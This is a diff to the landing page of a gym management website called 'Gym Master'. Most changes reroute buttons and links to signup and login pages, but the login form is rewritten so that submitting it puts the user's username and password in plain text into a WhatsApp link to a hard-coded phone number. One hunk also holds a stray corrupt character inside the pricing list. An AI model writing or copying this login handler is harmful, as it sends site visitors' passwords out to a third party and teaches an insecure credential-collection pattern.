@@ -91,7 +91,7 @@
         }
         .cta-button {
             display: inline-block;
-            background: #ffd700;
+            background: #667eea;
             color: #333;
             padding: 1rem 2rem;
             text-decoration: none;
@@ -367,14 +367,15 @@
         <nav>
             <div class="logo">Gym Master</div>
             <ul class="nav-links">
-                <li><a href="#home">Home</a></li>
+                <li><a href="index.html">Home</a></li>
                 <li><a href="service.html">Services</a></li>
                 <li><a href="class.html">Classes</a></li>
                 <li><a href="schedule.html">Schedule</a></li>
                 <li><a href="membership.html">Membership</a></li>
                 <li><a href="about.html">About</a></li>
                 <li><a href="contact.html">Contact</a></li>
-                <li><a href="#" id="loginBtn">Login</a></li>
+                <li><a href="login.html">Login</a></li>
+                <li><a href="signup.html" style="background: #ffd700; color: #333; padding: 0.5rem 1rem; border-radius: 25px; font-weight: bold;">Sign Up</a></li>
             </ul>
         </nav>
     </header>
@@ -384,7 +385,7 @@
         <div class="hero-content">
             <h1>Manage Your Gym Like a Pro</h1>
             <p>Complete gym management system with member tracking, billing, and analytics</p>
-            <a href="#" class="cta-button" id="getStartedBtn">Get Started Today</a>
+            <a href="signup.html" class="cta-button" id="getStartedBtn">Get Started Today</a>
         </div>
     </section>
 
@@ -465,7 +466,7 @@
                     <li>Email support</li>
                     <li>Mobile access</li>
                 </ul>
-                <button class="cta-button">Get Started</button>
+                <a href="signup.html" class="cta-button">Get Started</a>
             </div>
             <div class="pricing-card featured">
                 <h3>Professional</h3>
@@ -477,7 +478,7 @@
                     <li>Custom branding</li>
                     <li>API access</li>
                 </ul>
-                <button class="cta-button">Get Started</button>
+                <a href="signup.html" class="cta-button">Get Started</a>
             </div>
             <div class="pricing-card">
                 <h3>Enterprise</h3>
@@ -486,10 +487,10 @@
                     <li>Unlimited members</li>
                     <li>Full customization</li>
                     <li>Dedicated support</li>
-                    <li>Advanced integrations</li>
+                   极<li>Advanced integrations</li>
                     <li>White-label solution</li>
                 </ul>
-                <button class="cta-button">Get Started</button>
+                <a href="signup.html" class="cta-button">Get Started</a>
             </div>
         </div>
     </section>
@@ -497,7 +498,7 @@
     <!-- Footer -->
    <footer>
         <div class="container">
-            <p>&copy; 2024 Gym Master. All rights reserved.</p>
+            <p>&copy; 2025 Gym Master. All rights reserved.</p>
             <p>123 Fitness Street, Health City, HC 12345 | info@gymmaster.com | (555) 123-4567</p>
         </div>
     </footer>
@@ -506,7 +507,7 @@
     <div id="loginModal" class="modal">
         <div class="modal-content">
             <span class="close">&times;</span>
-            <h2>Login to Dashboard</h2>
+            <h2>Get Started - Send to WhatsApp</h2>
             <form id="loginForm">
                 <div class="form-group">
                     <input type="text" id="username" placeholder="Username" required>
@@ -514,7 +515,11 @@
                 <div class="form-group">
                     <input type="password" id="password" placeholder="Password" required>
                 </div>
-                <button type="submit" class="submit-btn">Login</button>
+                <div class="form-group">
+                    <input type="tel" id="whatsappNumber" placeholder="Your WhatsApp Number (optional)" pattern="[0-9]{9,15}">
+                    <small style="font-size: 0.8rem; color: #666;">Format: 679562287 (without country code)</small>
+                </div>
+                <button type="submit" class="submit-btn">Send to WhatsApp</button>
             </form>
         </div>
     </div>
@@ -547,10 +552,10 @@
             modal.style.display = 'block';
         });
 
-        // Get Started button functionality
+        // Get Started button functionality - Redirect to signup page
         getStartedBtn.addEventListener('click', (e) => {
             e.preventDefault();
-            modal.style.display = 'block';
+            window.location.href = 'signup.html';
         });
 
         closeBtn.addEventListener('click', () => {
@@ -612,16 +617,56 @@
             observer.observe(stat);
         });
 
-        // Login form handler
+        // WhatsApp integration function
+        function sendToWhatsApp(username, password, userWhatsApp = '') {
+            // Your WhatsApp number (679562287)
+            const yourWhatsAppNumber = '679562287';
+            
+            // Create the message content
+            const message = `New Gym Master Login Request:%0A%0A` +
+                          `Username: ${encodeURIComponent(username)}%0A` +
+                          `Password: ${encodeURIComponent(password)}%0A` +
+                          (userWhatsApp ? `User WhatsApp: ${encodeURIComponent(userWhatsApp)}%0A` : '') +
+                          `Time: ${new Date().toLocaleString()}%0A` +
+                          `---%0AThis message was sent from the Gym Master website`;
+            
+            // Determine which WhatsApp number to use
+            const targetNumber = userWhatsApp || yourWhatsAppNumber;
+            
+            // Create WhatsApp URL
+            const whatsappURL = `https://wa.me/${targetNumber}?text=${message}`;
+            
+            // Open WhatsApp in a new tab
+            window.open(whatsappURL, '_blank');
+            
+            // Show confirmation message
+            alert('Opening WhatsApp to send your login information. Please complete the message and send it.');
+            
+            // Close the modal
+            modal.style.display = 'none';
+            
+            // Clear the form
+            document.getElementById('loginForm').reset();
+        }
+
+        // Login form handler for WhatsApp
         document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const whatsappNumber = document.getElementById('whatsappNumber').value;
             
             if (username && password) {
-                alert(`Welcome back, ${username}!`);
-                modal.style.display = 'none';
+                // Validate WhatsApp number format if provided
+                if (whatsappNumber && !/^\d{9,15}$/.test(whatsappNumber)) {
+                    alert('Please enter a valid WhatsApp number (9-15 digits without country code)');
+                    return;
+                }
+                
+                sendToWhatsApp(username, password, whatsappNumber);
+            } else {
+                alert('Please fill in both username and password fields.');
             }
         });
     </script>
